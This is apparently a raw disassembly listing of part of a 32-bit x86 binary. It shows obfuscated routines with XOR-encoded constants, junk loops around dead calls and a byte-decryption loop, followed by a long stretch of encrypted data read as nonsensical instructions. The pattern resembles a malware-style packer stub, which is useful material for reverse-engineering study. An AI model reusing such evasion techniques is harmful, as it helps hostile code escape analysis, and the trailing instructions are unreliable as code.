  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41e130,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41e384,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41e130
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41e2ac
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41e384
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41e130
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41e2ac
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41e2ac
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41e2ac
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41e330,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41e328,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41e2ac
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x43001c
  410baa:	or     DWORD PTR ds:0x42f008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x43200c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x43200c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x43200c,ecx
  410be0:	cmp    DWORD PTR ds:0x43200c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x43200c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x42468d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42b04c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41e12c
  410c2b:	sbb    DWORD PTR ds:0x43201c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x430004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x430004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x430004,ecx
  410c4d:	cmp    DWORD PTR ds:0x430004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x42b014
  410c65:	cmp    DWORD PTR ds:0x430004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x42f024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x42f024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x42f024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x42b018
  410ca1:	cmp    DWORD PTR ds:0x42f024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x42f024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x42f024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x42f024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x42f024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41e334
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x43001c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x43300c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x43300c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x43300c,ecx
  410d03:	cmp    DWORD PTR ds:0x43300c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42b01c
  410d24:	cmp    DWORD PTR ds:0x43300c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x43300c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x43300c,ecx
  410d40:	cmp    DWORD PTR ds:0x43300c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x433010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41e2ac
  410d65:	sbb    DWORD PTR ds:0x432018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42f01c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x432018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x432018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x432018,ecx
  410da6:	cmp    DWORD PTR ds:0x432018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x432018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x4246ef
  410dc5:	push   0x4246d1
  410dca:	call   DWORD PTR ds:0x42b050
  410dd0:	cmp    DWORD PTR ds:0x432018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x432018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x432018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x430000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x431000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x433010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x42f020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x433010,0x17
  410e47:	cmp    DWORD PTR ds:0x433010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x433010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x42b054
  410e6f:	cmp    DWORD PTR ds:0x433010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x433010
  410e81:	dec    eax
  410e82:	mov    ds:0x433010,eax
  410e87:	mov    eax,ds:0x433010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x433010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x433004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x433004
  410eab:	inc    eax
  410eac:	mov    ds:0x433004,eax
  410eb1:	cmp    DWORD PTR ds:0x433004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x433004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x43201c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x42b058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x433014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x42f000,0x43000c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x43300c,0x430014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x430008,0x42f014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x431018,0x430018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x430004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x433010,0x42f01c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x42f020,0x431018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42f01c,0x42f000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x433010,0x1047
  410f77:	mov    eax,ds:0x41e2cc
  410f7c:	and    DWORD PTR ds:0x42f018,0x432010
  410f86:	push   0x41e222
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x431000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x42f008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x433010,0x43300c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x42f010,0x42f014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x432018,0x43300c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x431000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x430008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x430008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x430008,ebx
  410ff5:	cmp    DWORD PTR ds:0x430008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x43300c
  411007:	push   0x433010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42b05c
  411017:	cmp    DWORD PTR ds:0x430008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x430004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x430004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x430004,ebx
  41103d:	cmp    DWORD PTR ds:0x430004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x42b020
  41105d:	cmp    DWORD PTR ds:0x430004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x431018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x432018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41e0c8
  411086:	mov    ebx,DWORD PTR ds:0x41e0cc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x430018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x430018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x430018,ebx
  4110b0:	cmp    DWORD PTR ds:0x430018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x430018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x42b028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x433004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x431004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x431004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x431004,ebx
  411104:	cmp    DWORD PTR ds:0x431004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x42462e
  411116:	call   DWORD PTR ds:0x42b02c
  41111c:	cmp    DWORD PTR ds:0x431004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x431004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x431004,ebx
  411136:	cmp    DWORD PTR ds:0x431004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x432014
  41114a:	sbb    DWORD PTR ds:0x42f000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xc98115d3
  411322:	inc    esi
  411323:	push   edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x66]
  41132c:	push   ebx
  41132d:	push   cs
  41132e:	mov    al,ds:0xc0edae1a
  411333:	or     DWORD PTR [edi+0x52bc056],esi
  411339:	pop    ebx
  41133a:	mov    edi,ebp
  41133c:	and    al,0x72
  41133e:	dec    ebp
  41133f:	sub    ch,ch
  411341:	cmp    edx,ecx
  411343:	dec    edi
  411344:	add    al,0xb0
  411346:	out    0x7b,eax
  411348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411349:	jnp    0x41130c
  41134b:	retf   
  41134c:	mov    al,ds:0x2b0cf30e
  411351:	jo     0x411310
  411353:	and    BYTE PTR [edi+eiz*1],al
  411356:	je     0x4112eb
  411358:	hlt    
  411359:	adc    al,0x7
  41135b:	mov    WORD PTR [edx+edx*4-0x4804e77],?
  411362:	inc    ebx
  411363:	ja     0x4113d6
  411365:	mov    al,0xab
  411368:	mov    eax,ds:0x667622af
  41136d:	test   al,0x87
  41136f:	or     al,0xbf
  411371:	ss cld 
  411373:	call   0x3d066895
  411378:	pop    ecx
  411379:	adc    DWORD PTR [ecx-0x7c],0x20e51ef5
  411380:	ja     0x4113e3
  411382:	shl    DWORD PTR [ecx],cl
  411384:	stos   BYTE PTR es:[edi],al
  411385:	pop    eax
  411386:	test   eax,0x90f37583
  41138b:	out    dx,eax
  41138c:	fld    QWORD PTR [esi]
  41138e:	addr16 popf 
  411390:	or     al,0x9
  411392:	pop    esi
  411393:	popf   
  411394:	ror    DWORD PTR [eax+0x69810196],cl
  41139a:	mov    dh,0xd5
  41139d:	mov    ebp,0xdda09225
  4113a2:	add    esi,ebp
  4113a4:	mov    esp,0x2b7dc3fb
  4113a9:	sbb    eax,0x43d7e5cb
  4113ae:	das    
  4113af:	dec    esp
  4113b0:	popf   
  4113b1:	(bad)  
  4113b2:	cmp    ecx,DWORD PTR [eax+0x58]
  4113b5:	mov    esp,0xd48da7be
  4113ba:	sbb    ebx,DWORD PTR [edx+0x5d]
  4113bd:	add    bh,bh
  4113bf:	cmc    
  4113c0:	les    ebx,FWORD PTR [eax+ecx*2-0x58bbbb5]
  4113c7:	add    eax,0x8aad8c99
  4113cc:	jo     0x41140e
  4113ce:	repz jae 0x411425
  4113d1:	jae    0x411354
  4113d3:	rcr    DWORD PTR [ebp-0x37],0x75
  4113d7:	xchg   ebx,eax
  4113d8:	lds    edx,FWORD PTR [edi]
  4113da:	jp     0x4113ca
  4113dc:	mov    WORD PTR [edx+0x51],ds
  4113df:	outs   dx,BYTE PTR ds:[esi]
  4113e0:	xor    edi,esi
  4113e2:	(bad)  
  4113e3:	cmc    
  4113e4:	ins    BYTE PTR es:[edi],dx
  4113e5:	sub    DWORD PTR [ebx+0x41],eax
  4113e8:	(bad)  
  4113e9:	jno    0x4113dc
  4113eb:	sub    BYTE PTR [edx+edx*8],dl
  4113ee:	mov    eax,ds:0xa6f61092
  4113f3:	nop
  4113f4:	inc    esp
  4113f5:	pop    edi
  4113f6:	push   ebx
  4113f7:	lock test eax,0x317364a9
  4113fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113fe:	and    bl,BYTE PTR ds:[esi+0x56]
  411402:	pop    ds
  411403:	pop    edx
  411404:	inc    edx
  411405:	pop    esp
  411406:	push   esi
  411407:	cdq    
  411408:	jle    0x411472
  41140a:	out    0x5b,al
  41140c:	xor    DWORD PTR [esp+0x4c2c49aa],edx
  411413:	ficomp WORD PTR [edx]
  411415:	mov    ds:0x7cf8d91c,al
  41141a:	jmp    0x3609574e
  41141f:	inc    eax
  411420:	add    al,0x77
  411422:	repz aam 0xae
  411425:	sti    
  411426:	push   0xffffff99
  411428:	paddw  mm3,mm5
  41142b:	arpl   WORD PTR [edx],bp
  41142d:	xor    eax,0x39f0aad6
  411432:	adc    esp,edi
  411434:	mov    ebx,0xc1759361
  411439:	mov    bl,0x70
  41143b:	jl     0x411405
  41143d:	dec    esp
  41143e:	adc    eax,DWORD PTR [eax-0x43d0c317]
  411444:	xor    ch,0xe0
  411447:	aam    0x4c
  411449:	into   
  41144a:	pushf  
  41144b:	pop    ecx
  41144c:	xor    BYTE PTR [ecx+0x61640ee2],bl
  411452:	add    eax,0x97e69351
  411457:	mov    ebx,DWORD PTR [ecx-0x26]
  41145a:	popa   
  41145b:	mov    esp,0xe0782a11
  411460:	sbb    DWORD PTR [eax],edx
  411462:	stos   BYTE PTR es:[edi],al
  411463:	aam    0x68
  411465:	or     cl,ah
  411467:	push   eax
  411468:	popf   
  411469:	das    
  41146a:	jge    0x41144a
  41146c:	jge    0x41143b
  41146e:	stc    
  41146f:	jmp    0x82d2:0xbd49616d
  411476:	mov    ch,0xb0
  411478:	fsubr  st,st(0)
  41147a:	ins    DWORD PTR es:[edi],dx
